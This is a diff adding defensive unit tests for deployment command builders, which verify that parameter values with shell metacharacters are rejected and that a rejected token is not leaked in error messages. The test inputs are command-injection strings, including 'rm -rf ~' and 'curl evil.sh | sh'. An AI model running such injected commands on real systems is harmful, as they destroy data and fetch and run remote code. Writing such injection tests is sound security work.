@@ -73,6 +73,28 @@ describe('assembleCommand', () => {
     expect(assembleCommand(TARGETS.ec2, params).command).toContain('--ghcr-token ***');
     expect(assembleCommand(TARGETS.ec2, params, { mask: false }).command).toContain('--ghcr-token ghp_real');
   });
+
+  it('rejects a param value carrying shell metacharacters (command injection)', () => {
+    // The assembled command is executed via a shell, so an unquoted injection
+    // in any value must be refused rather than interpolated.
+    expect(() => assembleCommand(TARGETS.fargate, { domain: 'd; rm -rf ~', hostedZoneId: 'z' }))
+      .toThrow('unsafe characters');
+    expect(() => assembleCommand(TARGETS.fargate, { domain: 'd', hostedZoneId: '$(whoami)' }))
+      .toThrow('unsafe characters');
+  });
+
+  it('does not echo a secret value when it is rejected for unsafe characters', () => {
+    // redactValue: the error must name the flag but never leak the token body.
+    try {
+      assembleCommand(TARGETS.ec2, { keyPair: 'k', domain: 'd', hostedZoneId: 'z', ghcrToken: 'ghp_evil`id`' }, { mask: false });
+      throw new Error('expected assembleCommand to throw');
+    } catch (err) {
+      const msg = err instanceof Error ? err.message : String(err);
+      expect(msg).toContain('--ghcr-token');
+      expect(msg).toContain('unsafe characters');
+      expect(msg).not.toContain('ghp_evil');
+    }
+  });
 });
 
 describe('teardownCommand', () => {
@@ -100,6 +122,11 @@ describe('teardownCommand', () => {
     expect(plain.command).toContain('bin/teardown.sh --stack-prefix pb --region eu-west-1');
     expect(plain.command).not.toContain('--yes');
     expect(teardownCommand('fargate', { assumeYes: true }).command).toContain('--yes');
+  });
+
+  it('rejects a stackName or region carrying shell metacharacters (command injection)', () => {
+    expect(() => teardownCommand('ec2', { stackName: 'pb; curl evil.sh | sh' })).toThrow('unsafe characters');
+    expect(() => teardownCommand('ec2', { region: 'us-east-1 && rm -rf ~' })).toThrow('unsafe characters');
   });
 });
 
